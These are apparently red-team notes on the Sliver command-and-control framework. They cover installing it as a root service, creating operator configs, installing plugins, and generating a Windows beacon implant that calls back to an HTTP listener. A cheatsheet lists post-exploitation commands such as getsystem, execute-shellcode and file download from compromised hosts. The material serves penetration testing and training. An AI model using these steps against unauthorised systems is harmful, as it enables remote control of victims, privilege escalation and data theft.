## Installing Sliver
```bash
# Below is the easy way
wget -O /bin/sliver-server https://github.com/BishopFox/sliver/releases/download/v1.5.17/sliver-server_linux 
chmod 755 /bin/sliver-server

wget -O /bin/sliver https://github.com/BishopFox/sliver/releases/download/v1.5.17/sliver-client_linux 
chmod 755 /bin/sliver

# Unpack assets, as user
sliver-server unpack --force

# Windows C Compiler
sudo apt install mingw-w64



```
We can make it run on startup by making a service
```bash
vi /etc/systemd/system/sliver.service
# Paste below file
```

```
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
```
Then
```bash
chmod 600 /etc/systemd/system/sliver.service
systemctl enable sliver && systemctl start sliver

# If you run into errors, it might be because sliver files already exist on your system, in /home/kali/.sliver, /root/.sliver, and ~/.sliver

# Check that the server is up
netstat -antopul


```

## Adding a New Operator
```bash
cd ~
sliver-server
# Review command
[server] sliver > help new-operator
# Listen on specific IP
[server] sliver > new-operator -n attacker -l tun0

# More generous allow

[server] sliver > new-operator -n attacker2 -l 0.0.0.0
# Enable multiplayer
[server] sliver > multiplayer

# New session
# Import the attacker config
sliver import attacker_0.0.0.0.cfg


```

## Armory
Sliver's armory is a plugin system
```bash
# Get help
sliver > armory
# Install all
sliver > armory install all
```


## Generating Beacons
There's a lot of factors. The below generates a beacon that is called 'http_beacon', is a windows executable,
```bash
sliver > generate beacon help
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
```

## Cheatsheet

| **Command**                                                               | **Description**                                              |
| ------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `help`                                                                    | Displays the commands and their descriptions                 |
| `http -L <Local IP> -l <Port>`                                            | Set up HTTP listener                                         |
| `profiles new --http <Local IP>:<Port> --format shellcode <Profile Name>` | Create a new C2 profile                                      |
| `stage-listener --url tcp://<Localhost:Port> --profile <Profile name>`    | Set up Stager listener                                       |
| `generate --http <Local IP>:<Port> --os <OS>`                             | Generates a session implant                                  |
| `generate beacon --http <Local IP>:<Port> --os <OS>`                      | Generates a beacon implant                                   |
| `sessions`                                                                | Lists active/inactive sessions                               |
| `sessions -K`                                                             | Removes all sessions available or not                        |
| `sessions prune`                                                          | Removes unavailable sessions                                 |
| `sessions -k -i <session>`                                                | Removes the specified session                                |
| `beacons`                                                                 | Lists active/inactive beacons                                |
| `tasks`                                                                   | Lists the pending or completed tasks ran by the operator     |
| `getsystem`                                                               | Attempts to get a session as NT AUTHORITY\SYSTEM             |
| `interactive`                                                             | Tasks the beacon to spawn a session that becomes interactive |
| `cd`                                                                      | Change directory                                             |
| `ls`                                                                      | Lists the contents of the directory                          |
| `download <file/directory>`                                               | Downloads a file/directory                                   |
| `upload`                                                                  | Uploads a file                                               |
| `execute-assembly`                                                        | Executes a .NET assembly in a child process                  |
| `execute-shellcode`                                                       | Executes the specified shellcode in process                  |
| `multiplayer`                                                             | Enables multiplayer mode on the server                       |
| `armory install <alias/extension>`                                        | Installs the given alias/extension                           |
| `armory install all`                                                      | Installs all of the available aliases/extensions             |